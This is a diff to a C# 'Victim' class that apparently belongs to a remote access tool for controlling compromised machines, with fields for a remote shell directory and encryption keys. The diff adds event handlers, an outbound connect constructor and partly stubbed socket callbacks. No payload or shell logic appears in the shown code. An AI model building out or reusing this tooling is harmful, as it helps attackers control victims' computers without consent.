@@ -11,16 +11,24 @@ using System.Net.Sockets;
 public class Victim
 {
     public Socket socket;
+    public int MAX_BUFFER_LENGTH = 65536;
     public byte[] buffer = new byte[65536];
     public string ID;
     public string rAddr; //Remote address.
     public int rPort; //Remote port.
     public string shell_cd; //SHELL CURRENT DIR
     public bool unix_like;
+    public bool remote_conntect;
 
     //CRYPTOGRAPHY
     public (string PublicKey, string PrivateKey) KeyPairs;
     public (byte[] Key, byte[] IV) _AES;
+
+    //RECEIVE EVENTS
+    public delegate void ReceivedEventHandler(Victim v, (int Command, int Param, int DataLength, byte[] MessageData) buffer, int rec);
+    public event ReceivedEventHandler Received;
+    public delegate void DisconnectedEventHandler(Victim v);
+    public event DisconnectedEventHandler Disconnected;
 
     public Victim(Socket socket)
     {
@@ -28,6 +36,12 @@ public class Victim
         this.socket = socket;
         rAddr = split[0];
         rPort = int.Parse(split[1]);
+    }
+    public Victim(string ip, int port)
+    {
+        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
+        sock.BeginConnect(ep, new AsyncCallback(ConnectCallback), sock);
     }
 
     public void Send(int Command, int Param, byte[] buffer)
@@ -56,6 +70,55 @@ public class Victim
             {
                 MessageBox.Show("OH SHIT!");
             }
+        }
+    }
+
+    public void ConnectCallback(IAsyncResult ar)
+    {
+        try
+        {
+            Socket sock = (Socket)ar.AsyncState;
+            if (sock == null)
+                return;
+
+            sock.EndConnect(ar);
+
+            byte cmd = 1;
+            byte param = 0;
+            byte[] buf = new RP(cmd, param, Encoding.UTF8.GetBytes("")).GetBytes();
+            sock.BeginSend(buf, 0, buf.Length, SocketFlags.None, new AsyncCallback(SendCallBack), sock);
+        }
+        catch (Exception ex)
+        {
+
+        }
+    }
+    private void SendCallBack(IAsyncResult ar)
+    {
+        try
+        {
+            Socket sock = (Socket)ar.AsyncState;
+            Victim v = new Victim(sock);
+            sock.EndSend(ar);
+            sock.BeginReceive(v.buffer, 0, MAX_BUFFER_LENGTH, SocketFlags.None, new AsyncCallback(ReadCallback), v);
+        }
+        catch (Exception ex)
+        {
+
+        }
+    }
+    private void ReadCallback(IAsyncResult ar)
+    {
+        Victim v = (Victim)ar.AsyncState;
+        try
+        {
+            Socket sock = v.socket;
+            RP rp = null;
+            int recv_len = 0;
+        }
+        catch (Exception ex)
+        {
+
         }
     }
 
